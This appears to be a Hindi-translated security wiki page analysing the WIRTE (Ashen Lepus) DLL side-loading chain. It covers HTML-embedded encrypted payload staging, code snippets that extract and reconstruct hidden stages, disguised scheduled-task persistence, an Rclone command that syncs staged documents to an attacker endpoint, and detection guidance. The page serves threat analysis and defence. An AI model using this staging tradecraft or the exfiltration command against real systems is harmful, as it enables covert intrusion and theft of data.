# HTML-Embedded Payload Staging के साथ Advanced DLL Side-Loading

{{#include ../../../banners/hacktricks-training.md}}

## तकनीक का अवलोकन

Ashen Lepus (aka WIRTE) ने एक दोहराए जा सकने वाले पैटर्न को weaponize किया, जो DLL sideloading, staged HTML payloads और modular .NET backdoors को जोड़कर Middle Eastern diplomatic networks में बने रहने के लिए इस्तेमाल होता है। यह तकनीक किसी भी operator द्वारा दोबारा इस्तेमाल की जा सकती है, क्योंकि यह इन चीज़ों पर निर्भर करती है:<sup>[[1]](#references)</sup>

- **Archive-आधारित social engineering**: सामान्य PDFs targets को निर्देश देती हैं कि वे किसी file-sharing site से RAR archive डाउनलोड करें। इस archive में असली दिखने वाला document viewer EXE, किसी trusted library के नाम वाली malicious DLL (जैसे, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) और एक decoy `Document.pdf` शामिल होते हैं।
- **DLL search order का दुरुपयोग**: victim EXE पर double-click करता है, Windows current directory से DLL import resolve करता है, और malicious loader (AshenLoader) trusted process के भीतर execute होता है, जबकि शक से बचने के लिए decoy PDF खुल जाता है।
- **Living-off-the-land staging**: हर बाद का stage (AshenStager → AshenOrchestrator → modules) ज़रूरत पड़ने तक disk पर नहीं रखा जाता; उन्हें otherwise harmless HTML responses में छिपे encrypted blobs के रूप में भेजा जाता है।

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE, AshenLoader को side-load करता है। AshenLoader host recon करता है, उसे AES-CTR से encrypt करता है और `token=`, `id=`, `q=` या `auth=` जैसे बदलते parameters के भीतर, API जैसे दिखने वाले paths (जैसे, `/api/v2/account`) पर POST करता है।<sup>[[1]](#references)</sup>
2. **HTML extraction**: C2 अगला stage तभी उजागर करता है, जब client IP की geolocation target region में होती है और `User-Agent` implant से मेल खाता है; इससे sandboxes को निराश किया जाता है। जाँचें सफल होने पर HTTP body में `<headerp>...</headerp>` blob होता है, जिसमें Base64/AES-CTR-encrypted AshenStager payload होता है।
3. **दूसरा sideload**: AshenStager को एक अन्य legitimate binary के साथ deploy किया जाता है, जो `wtsapi32.dll` import करता है। इस binary में inject की गई malicious copy और HTML fetch करती है; इस बार AshenOrchestrator को निकालने के लिए `<article>...</article>` को parse करती है।
4. **AshenOrchestrator**: एक modular .NET controller, जो Base64 JSON config को decode करता है। Config के `tg` और `au` fields को जोड़कर/hash करके AES key बनाई जाती है, जो `xrk` को decrypt करती है। इससे मिले bytes बाद में fetch किए गए हर module blob के लिए XOR key की तरह काम करते हैं।
5. **Module delivery**: हर module का विवरण HTML comments के ज़रिए दिया जाता है, जो parser को किसी मनमाने tag पर भेजते हैं। इससे उन static rules को दरकिनार किया जाता है जो केवल `<headerp>` या `<article>` खोजते हैं। Modules में persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) और file exploration (`FE`) शामिल हैं।

### HTML Container Parsing Pattern

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

भले ही defenders किसी खास element को block या strip कर दें, delivery फिर से शुरू करने के लिए operator को केवल HTML comment में बताए गए tag को बदलना होगा।<sup>[[1]](#references)</sup>

### Quick Extraction Helper (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## HTML Staging Evasion के समानांतर

हालिया HTML smuggling research (Talos) में HTML attachments के `<script>` blocks के अंदर Base64 strings के रूप में छिपाए गए payloads का उल्लेख है, जिन्हें runtime पर JavaScript से decode किया जाता है।<sup>[[2]](#references)</sup> यही तरीका C2 responses के लिए भी इस्तेमाल किया जा सकता है: encrypted blobs को script tag (या किसी अन्य DOM element) के अंदर stage करें और AES/XOR से पहले उन्हें memory में decode करें, जिससे page सामान्य HTML जैसा दिखे। Talos ने script tags के अंदर layered obfuscation (identifier renaming और Base64/Caesar/AES) भी दिखाया है, जो HTML-staged C2 blobs के लिए आसानी से अनुकूल है।<sup>[[2]](#references)</sup> **hidden text salting** पर Talos की बाद की writeup भी यहां प्रासंगिक है: Base64 को अप्रासंगिक HTML comments या whitespace से बांटना simple regex extractors को विफल करने के लिए काफी है, जबकि browser-side reconstruction आसान रहती है।<sup>[[7]](#references)</sup>

## हालिया Variant Notes (2024-2025)

- Check Point ने 2024 में WIRTE campaigns देखे, जो अब भी archive-based sideloading पर निर्भर थे, लेकिन first stage के रूप में `propsys.dll` (stagerx64) का इस्तेमाल करते थे। Stager अगले payload को Base64 + XOR (key `53`) से decode करता है, hardcoded `User-Agent` के साथ HTTP requests भेजता है और HTML tags के बीच embedded encrypted blobs निकालता है। एक branch में, `RtlIpv4StringToAddressA` से decode किए गए embedded IP strings की लंबी सूची से stage को reconstruct किया गया, फिर उन्हें जोड़कर payload bytes बनाए गए।<sup>[[3]](#references)</sup>
- OWN-CERT ने पहले के WIRTE tooling का दस्तावेजीकरण किया, जिसमें side-loaded `wtsapi32.dll` dropper ने strings को Base64 + TEA से सुरक्षित रखा और DLL के नाम को ही decryption key के रूप में इस्तेमाल किया। इसके बाद, C2 को भेजने से पहले host identification data को XOR/Base64 से obfuscate किया जाता था।<sup>[[4]](#references)</sup>

## IP-Encoded Stages को Reconstruct करना

WIRTE की 2024 `propsys.dll` branch दिखाती है कि अगला PE एक contiguous HTML blob के रूप में होना जरूरी नहीं है। Loader stage bytes को dotted-quad strings के रूप में stash कर सकता है और `RtlIpv4StringToAddressA` से उन्हें फिर से बना सकता है। यह तरीका Hive की **IPfuscation** tradecraft से काफी मिलता-जुलता है।<sup>[[3]](#references)[[5]](#references)</sup> व्यवहार में यह तब उपयोगी है जब actor चाहता है कि HTML page में स्पष्ट Base64 payload के बजाय हानिरहित दिखने वाले IOCs या config data हों।

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

अगर recovered bytes की शुरुआत `MZ` से होती है, तो संभवतः आपने अगला PE सीधे reconstruct किया है। अगर ऐसा नहीं है, तो addresses के बीच शुरुआती XOR/Base64 layer या छोटे delimiter chunks देखें।

## बदलने योग्य DLL नाम और Host Rotation

इस pattern की एक अहम विशेषता यह है कि **HTML/AES/XOR staging backend समान रह सकता है, जबकि केवल sideload pair बदलता है**। WIRTE ने अलग-अलग campaigns में `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`, और `propsys.dll` का इस्तेमाल किया। यह उपयोगी है, क्योंकि:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` और `wtsapi32.dll` ऐसे आम Windows DLL नाम हैं, जिनके `%System32%` / `%SysWOW64%` में मौजूद होने की उम्मीद defenders करते हैं।
- **HijackLibs** जैसे सार्वजनिक catalogs पहले से ही ऐसे कई binaries की mapping करते हैं, जो copied application directory से इन DLL नामों को load करेंगे। इससे operators को stager को नए सिरे से बनाए बिना replacement hosts मिल जाते हैं।
- हर host के लिए केवल export surface को अनुकूलित करना पड़ता है। HTML parser, AES/XOR routines, और module loader को आम तौर पर forwarding proxy DLL में बिना बदलाव के इस्तेमाल किया जा सकता है।

Offensive lab में इसका मतलब है कि आप समस्या को दो हिस्सों में बाँट सकते हैं: **(1) ऐसा स्थिर signed host ढूँढ़ना जो आपके चुने हुए DLL नाम को local रूप से resolve करे**, और **(2) उसी DLL के पीछे वही staged-HTML loader logic दोबारा इस्तेमाल करना**।

## Crypto और C2 को मजबूत करना

- **हर जगह AES-CTR**: मौजूदा loaders में 256-bit keys और nonces (जैसे, `{9a 20 51 98 ...}`) embedded होते हैं और decryption से पहले/बाद में `msasn1.dll` जैसी strings का इस्तेमाल करके XOR layer भी जोड़ी जा सकती है।<sup>[[1]](#references)</sup>
- **Key material में बदलाव**: पुराने loaders embedded strings को सुरक्षित रखने के लिए Base64 + TEA का इस्तेमाल करते थे; decryption key malicious DLL नाम (जैसे, `wtsapi32.dll`) से derive की जाती थी।<sup>[[4]](#references)</sup>
- **Infrastructure split + subdomain camouflage**: staging servers हर tool के लिए अलग होते हैं, अलग-अलग ASNs पर host किए जाते हैं, और कभी-कभी वैध दिखने वाले subdomains के पीछे रखे जाते हैं। इससे एक stage उजागर होने पर बाकी का पता नहीं चलता।
- **Recon smuggling**: enumerated data में अब ऊँची प्राथमिकता वाले apps का पता लगाने के लिए Program Files listings शामिल होती हैं, और host से बाहर भेजे जाने से पहले इसे हमेशा encrypt किया जाता है।
- **URI में बदलाव**: query parameters और REST paths campaigns के बीच बदलते रहते हैं (`/api/v1/account?token=` → `/api/v2/account?auth=`), जिससे brittle detections निष्प्रभावी हो जाते हैं।
- **User-Agent pinning + सुरक्षित redirects**: C2 infrastructure केवल सटीक UA strings पर जवाब देता है; अन्य requests को सामान्य दिखने वाली news/health sites पर redirect किया जाता है, ताकि गतिविधि सामान्य लगे।
- **Gated delivery**: servers पर geo-fencing लागू है और वे केवल असली implants को जवाब देते हैं। अनधिकृत clients को संदिग्ध न लगने वाला HTML मिलता है।

## Persistence और Execution Loop

AshenStager ऐसे scheduled tasks बनाता है जो Windows maintenance jobs का रूप लेते हैं और `svchost.exe` के ज़रिए execute होते हैं, जैसे:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

ये tasks boot पर या तय अंतराल पर sideloading chain को दोबारा चलाते हैं, जिससे AshenOrchestrator बिना दोबारा disk को छुए नए modules माँग सकता है।

## Exfiltration के लिए Benign Sync Clients का इस्तेमाल

Operators एक dedicated module के ज़रिए diplomatic documents को `C:\Users\Public` (जहाँ वे सभी users को पढ़ने योग्य होते हैं और संदिग्ध नहीं लगते) में stage करते हैं, फिर उस directory को attacker storage के साथ sync करने के लिए वैध [Rclone](https://rclone.org/) binary download करते हैं। Unit42 के अनुसार, यह पहली बार है जब इस actor को exfiltration के लिए Rclone का इस्तेमाल करते देखा गया है। यह सामान्य traffic में घुलने-मिलने के लिए वैध sync tooling के दुरुपयोग के व्यापक रुझान के अनुरूप है:<sup>[[1]](#references)</sup>

1. **Stage**: target files को `C:\Users\Public\{campaign}\` में copy/collect करें।
2. **Configure**: attacker-controlled HTTPS endpoint (जैसे, `api.technology-system[.]com`) की ओर इशारा करने वाली Rclone config भेजें।
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` चलाएँ, ताकि traffic सामान्य cloud backups जैसा लगे।

चूँकि Rclone का वैध backup workflows में व्यापक रूप से इस्तेमाल होता है, defenders को असामान्य executions पर ध्यान देना चाहिए (नई binaries, संदिग्ध remotes, या `C:\Users\Public` का अचानक sync होना)।

## Detection के संकेत

- **ऐसे signed processes पर alert करें जो अप्रत्याशित रूप से user-writable paths से DLLs load करते हैं** (Procmon filters + `Get-ProcessMitigation -Module`), खासकर जब DLL नाम `netutils`, `srvcli`, `dwampi`, `wtsapi32`, या `propsys` से मेल खाते हों।<sup>[[6]](#references)</sup>
- संदिग्ध HTTPS responses में **असामान्य tags के भीतर embedded बड़े Base64 blobs** या `<!-- TAG: <xyz> -->` comments से सुरक्षित blobs देखें।
- HTML को पहले normalize करें: **Base64 extraction से पहले comments हटाएँ और whitespace को समेटें**, क्योंकि hidden-text-salting जैसी evasion payloads को comment boundaries के पार बाँट सकती है।
- HTML hunting में **`<script>` blocks के भीतर Base64 strings** भी शामिल करें (HTML smuggling-style staging), जिन्हें AES/XOR processing से पहले JavaScript के ज़रिए decode किया जाता है।
- **`RtlIpv4StringToAddressA` के बाद buffer assembly वाली बार-बार की calls** खोजें, खासकर जब आसपास की strings असली network targets के बजाय लंबी IPv4 lists हों।
- ऐसे **scheduled tasks** खोजें जो `svchost.exe` को non-service arguments के साथ चलाते हों या dropper directories की ओर इशारा करते हों।
- **C2 redirects** पर नज़र रखें, जो केवल सटीक `User-Agent` strings के लिए payload लौटाते हैं और अन्य requests को वैध news/health domains पर भेजते हैं।
- IT द्वारा प्रबंधित locations के बाहर दिखने वाली **Rclone** binaries, नई `rclone.conf` files, या `C:\Users\Public` जैसी staging directories से data खींचने वाले sync jobs पर नज़र रखें।

## References

- [1] [Hamas से संबद्ध Ashen Lepus ने नए AshTag Malware Suite के साथ Middle Eastern Diplomatic Entities को निशाना बनाया](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Tags के बीच छिपा हुआ: HTML smuggling में evasion techniques की जानकारी](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas से संबद्ध Threat Actor WIRTE ने Middle East में अपना Operations जारी रखा और Disruptive Activity की ओर बढ़ा](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: खोए हुए समय की तलाश में](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware ने Detection से बचने के लिए नई IPfuscation Technique का इस्तेमाल किया](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Non-System Locations से संभावित System DLL Sideloading](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Hidden Text Salting के साथ Email Threats में मसाला जोड़ना](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
